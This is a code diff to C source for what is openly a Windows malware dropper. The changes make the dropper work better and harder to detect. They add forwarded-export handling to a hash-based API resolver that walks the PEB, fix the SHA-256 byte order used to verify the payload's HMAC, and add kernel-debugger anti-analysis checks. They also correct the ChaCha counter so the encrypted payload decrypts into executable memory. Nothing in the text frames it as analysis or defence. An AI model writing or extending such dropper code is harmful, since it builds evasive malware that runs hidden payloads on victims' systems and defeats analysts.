@@ -308,6 +308,8 @@ static ULONG HashStringW(const WCHAR* s, SIZE_T len) {
 }
 
 static ULONG HashStringA(const char* s, SIZE_T len) {
+    /* len == 0 means "hash until NUL" - an export-name lookup passes 0 */
+    if (len == 0) { len = (SIZE_T)-1; }
     ULONG h = H_MAGIC_KEY;
     SIZE_T i = 0;
     for (; i < len; i++) {
@@ -345,21 +347,59 @@ static PIMAGE_NT_HEADERS64 PeHeaders(PVOID base) {
     return nt;
 }
 
+static PVOID LdrFwdResolve(char* fwd);
+
 static PVOID LdrFunction(PVOID lib, ULONG hash) {
     PIMAGE_NT_HEADERS64 nt = PeHeaders(lib);
     if (!nt) return NULL;
     DWORD exp_rva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
     if (!exp_rva) return NULL;
     PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)lib + exp_rva);
+    DWORD exp_size = nt->OptionalHeader.DataDirectory[0].Size;
     DWORD* names = (DWORD*)((BYTE*)lib + exp->AddressOfNames);
     DWORD* funcs = (DWORD*)((BYTE*)lib + exp->AddressOfFunctions);
     WORD* ords = (WORD*)((BYTE*)lib + exp->AddressOfNameOrdinals);
     for (DWORD i = 0; i < exp->NumberOfNames; i++) {
         const char* name = (const char*)((BYTE*)lib + names[i]);
-        if (HashStringA(name, 0) == hash)
-            return (PVOID)((BYTE*)lib + funcs[ords[i]]);
+        if (HashStringA(name, 0) == hash) {
+            PVOID fn = (PVOID)((BYTE*)lib + funcs[ords[i]]);
+            /* Forwarded export ("KERNELBASE.CreateFileW")? Parse the
+             * forwarding string and recurse instead of returning a
+             * pointer to it. */
+            ULONG_PTR fn_raw = (ULONG_PTR)fn;
+            if (fn_raw >= (ULONG_PTR)exp && fn_raw < (ULONG_PTR)exp + exp_size)
+                return LdrFwdResolve((char*)fn_raw);
+            return fn;
+        }
     }
     return NULL;
+}
+
+/* Resolve a forwarded export: split "Module.Function", look the module up
+ * via PEB (hash prefix + ".dll" the way LdrModule hashes BaseDllName),
+ * then recurse for the function.  Ordinal forwarding ("Module.#N") is not
+ * supported and returns NULL. */
+static PVOID LdrFwdResolve(char* fwd) {
+    WCHAR dll[64] = { 0 };
+    char* dot = fwd;
+    char* func;
+    PVOID mod;
+    SIZE_T pfx = 0, i;
+
+    while (*dot && *dot != '.') dot++;
+    if (!*dot) return NULL;
+    func = dot + 1;
+    pfx = (SIZE_T)(dot - fwd);
+    if (pfx == 0 || pfx > 59) return NULL;
+    if (*func == '#') return NULL;
+
+    for (i = 0; i < pfx; i++) dll[i] = (WCHAR)fwd[i];
+    *(ULONGLONG*)(&dll[pfx]) = 0x006C006C0064002Eull;   /* ".dll" as UTF-16LE */
+    dll[pfx + 4] = L'\0';
+
+    mod = LdrModule(HashStringW(dll, pfx + 4));
+    if (!mod) return NULL;
+    return LdrFunction(mod, HashStringA(func, 0));
 }
 
 /* -------------------------------------------------------------------------- */
@@ -622,7 +662,9 @@ static inline DWORD Sig1(DWORD x){return ROR32(x,17)^ROR32(x,19)^(x>>10);}
 
 static void Sha256Transform(SHA256_CTX* ctx, const BYTE* data) {
     DWORD a,b,c,d,e,f,g,h,t1,t2,m[64];
-    for (int i=0;i<16;i++) m[i] = U8TO32(data + 4*i);
+    for (int i=0;i<16;i++) /* SHA-256 words are BIG-endian; U8TO32 is ChaCha's LE helper */
+        m[i] = ((DWORD)data[4*i] << 24) | ((DWORD)data[4*i+1] << 16) |
+               ((DWORD)data[4*i+2] << 8) | (DWORD)data[4*i+3];
     for (int i=16;i<64;i++) m[i] = Sig1(m[i-2]) + m[i-7] + Sig0(m[i-15]) + m[i-16];
     a=ctx->state[0]; b=ctx->state[1]; c=ctx->state[2]; d=ctx->state[3];
     e=ctx->state[4]; f=ctx->state[5]; g=ctx->state[6]; h=ctx->state[7];
@@ -662,10 +704,15 @@ static void Sha256Final(SHA256_CTX* ctx, BYTE hash[32]) {
         pad = 0;
         Sha256Update(ctx, &pad, 1);
     }
-    BYTE len_buf[8];
-    for (int i=0;i<8;i++) len_buf[i] = (BYTE)(tot_bits >> (56 - i*8));
+    BYTE len_buf[8] = {0,0,0,0, /* 64-bit BE length; high 4 bytes are zero (<=512 MiB) */
+        (BYTE)(tot_bits >> 24), (BYTE)(tot_bits >> 16), (BYTE)(tot_bits >> 8), (BYTE)tot_bits};
     Sha256Update(ctx, len_buf, 8);
-    for (int i=0;i<8;i++) U32TO8(hash + 4*i, ctx->state[i]);
+    for (int i=0;i<8;i++) { /* output is BIG-endian */
+        hash[4*i]   = (BYTE)(ctx->state[i] >> 24);
+        hash[4*i+1] = (BYTE)(ctx->state[i] >> 16);
+        hash[4*i+2] = (BYTE)(ctx->state[i] >> 8);
+        hash[4*i+3] = (BYTE)(ctx->state[i]);
+    }
 }
 
 static void HmacSha256(const BYTE* key, DWORD klen, const BYTE* msg, DWORD mlen, BYTE out[32]) {
@@ -710,6 +757,23 @@ typedef ULONGLONG (WINAPI *pGetTickCount64)(void);
 
 static BOOLEAN AntiCheck(void) {
     if (NtCurrentPeb()->BeingDebugged) return FALSE;
+
+    /* Kernel debugger state via SystemKernelDebuggerInformation (class 35) -
+     * uses the already-resolved NtQuerySystemInformation (was dead weight)
+     * and reads KUSER_SHARED_DATA in the same pass */
+    {
+        PVOID ntdll = LdrModule(H_NTDLL_DLL);
+        if (ntdll) {
+            pNtQuerySystemInformation qsi =
+                (pNtQuerySystemInformation)LdrFunction(ntdll, H_NTQUERYSYSTEMINFORMATION);
+            if (qsi) {
+                struct { BOOLEAN Enabled; BOOLEAN NotPresent; } kd = { 0, 0 };
+                if (NT_SUCCESS(qsi(35, &kd, sizeof(kd), NULL)) && kd.Enabled) return FALSE;
+            }
+        }
+        /* KUSER_SHARED_DATA +0xBA: KernelDebuggerEnabled (independent check) */
+        if (*(BYTE*)((ULONG_PTR)0x7FFE0000 + 0xBA)) return FALSE;
+    }
 
     PVOID k32 = LdrModule(H_KERNEL32_DLL);
     if (k32) {
@@ -808,8 +872,10 @@ void DropperEntry(void) {
     HmacSha256(key, 32, cipher, PAYLOAD_LEN, hmac);
     if (!SecureEqual(hmac, blob + 12 + PAYLOAD_LEN, 32)) goto cleanup;
 
-    /* Decrypt in place */
-    ChaChaCrypt(key, blob /* nonce */, cipher, PAYLOAD_LEN, 1);
+    /* Decrypt in place - counter starts at 0: pack.py emits an RFC 7539
+     * IETF stream whose first keystream block is counter 0
+     * (ponytail: fixed offset, change both sides together). */
+    ChaChaCrypt(key, blob /* nonce */, cipher, PAYLOAD_LEN, 0);
 
     /* Allocate RX memory for the final payload and copy plaintext */
     PVOID exec = NULL;
